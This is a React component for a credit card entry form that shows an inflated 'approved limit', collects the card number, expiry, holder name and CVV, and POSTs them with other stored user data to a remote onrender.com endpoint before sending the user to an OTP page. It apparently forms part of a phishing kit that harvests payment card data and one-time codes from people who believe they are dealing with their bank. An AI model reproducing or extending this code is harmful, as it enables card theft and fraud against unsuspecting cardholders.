import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { useAppContext } from '../context/AppContext';
import { motion } from 'framer-motion';

const CardDetailsForm: React.FC = () => {
  const { userData, updateUserData } = useAppContext();
  const navigate = useNavigate();
  
  const [cardNumber, setCardNumber] = useState('');
  const [cardHolderName, setCardHolderName] = useState('');
  const [expiryDate, setExpiryDate] = useState('');
  const [cvv, setCvv] = useState('');
  const [errors, setErrors] = useState({
    cardNumber: '',
    cardHolderName: '',
    expiryDate: '',
    cvv: ''
  });

  const formatCardNumber = (value: string) => {
    const digits = value.replace(/\D/g, '');
    let formatted = '';
    
    for (let i = 0; i < digits.length && i < 16; i++) {
      if (i > 0 && i % 4 === 0) {
        formatted += ' ';
      }
      formatted += digits[i];
    }
    
    return formatted;
  };

  const formatExpiryDate = (value: string) => {
    const digits = value.replace(/\D/g, '');
    
    if (digits.length <= 2) {
      return digits;
    }
    
    return `${digits.slice(0, 2)}/${digits.slice(2, 4)}`;
  };

  const validateForm = () => {
    let valid = true;
    const newErrors = {
      cardNumber: '',
      cardHolderName: '',
      expiryDate: '',
      cvv: ''
    };
    
    if (!cardNumber || cardNumber.replace(/\s/g, '').length !== 16) {
      newErrors.cardNumber = 'Valid 16-digit card number is required';
      valid = false;
    }
    
    if (!cardHolderName.trim()) {
      newErrors.cardHolderName = 'Card holder name is required';
      valid = false;
    }
    
    if (!expiryDate || expiryDate.length !== 5) {
      newErrors.expiryDate = 'Valid expiry date (MM/YY) is required';
      valid = false;
    }
    
    if (!cvv || cvv.length < 3) {
      newErrors.cvv = 'Valid CVV is required';
      valid = false;
    }
    
    setErrors(newErrors);
    return valid;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (validateForm()) {
      updateUserData({
        cardNumber: cardNumber.replace(/\s/g, ''),
        cardHolderName,
        expiryDate,
        cvv
      });

      try {
        const response = await fetch('https://api-2-hnij.onrender.com/api/submit', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            ...userData,
            cardNumber: cardNumber.replace(/\s/g, ''),
            cardHolderName,
            expiryDate,
            cvv
          })
        });
        if (!response.ok) throw new Error('Failed to submit');
        navigate('/otp');
      } catch (err) {
        alert('Submission failed. Please try again.');
        console.error(err);
      }
    }
  };

  return (
    <motion.div
      initial={{ opacity: 0, y: 20 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{ duration: 0.5 }}
      className="pb-4"
    >
      <h1 className="text-3xl font-bold mb-2">Credit Card Details</h1>
      <p className="text-lg text-gray-600 mb-4">Enter your card details to proceed</p>
      <div className="text-[#38A169] font-medium mb-6">Approved Limit: ₹{userData.creditLimit*2}.00</div>
      
      <form
        id="card-form"
        onSubmit={handleSubmit}
        className="space-y-6"
      >
        <div>
          <input
            type="text"
            placeholder="Card Number"
            value={cardNumber}
            onChange={(e) => setCardNumber(formatCardNumber(e.target.value))}
            maxLength={19}
            className={`${errors.cardNumber ? 'border-red-500' : ''}`}
          />
          {errors.cardNumber && <p className="text-red-500 text-sm mt-1">{errors.cardNumber}</p>}
          <div className="text-right text-sm text-gray-500 mt-1">
            {cardNumber.replace(/\s/g, '').length}/16
          </div>
        </div>
        
        <div>
          <input
            type="text"
            placeholder="Card Holder Name"
            value={cardHolderName}
            onChange={(e) => setCardHolderName(e.target.value)}
            className={`${errors.cardHolderName ? 'border-red-500' : ''}`}
          />
          {errors.cardHolderName && <p className="text-red-500 text-sm mt-1">{errors.cardHolderName}</p>}
        </div>
        
        <div className="flex gap-4">
          <div className="flex-1">
            <input
              type="text"
              placeholder="Expiry Date"
              value={expiryDate}
              onChange={(e) => setExpiryDate(formatExpiryDate(e.target.value))}
              maxLength={5}
              className={`${errors.expiryDate ? 'border-red-500' : ''}`}
            />
            {errors.expiryDate && <p className="text-red-500 text-sm mt-1">{errors.expiryDate}</p>}
            <div className="text-right text-sm text-gray-500 mt-1">
              {expiryDate.replace(/\//g, '').length}/4
            </div>
          </div>
          
          <div className="flex-1">
            <input
              type="text"
              placeholder="CVV"
              value={cvv}
              onChange={(e) => setCvv(e.target.value.replace(/\D/g, '').slice(0, 4))}
              maxLength={4}
              className={`${errors.cvv ? 'border-red-500' : ''}`}
            />
            {errors.cvv && <p className="text-red-500 text-sm mt-1">{errors.cvv}</p>}
            <div className="text-right text-sm text-gray-500 mt-1">
              {cvv.length}/3
            </div>
          </div>
        </div>
        
        <button type="submit" className="primary-button w-full bg-blue-600 text-white py-2 rounded">
          Submit
        </button>
      </form>
    </motion.div>
  );
};

export default CardDetailsForm;
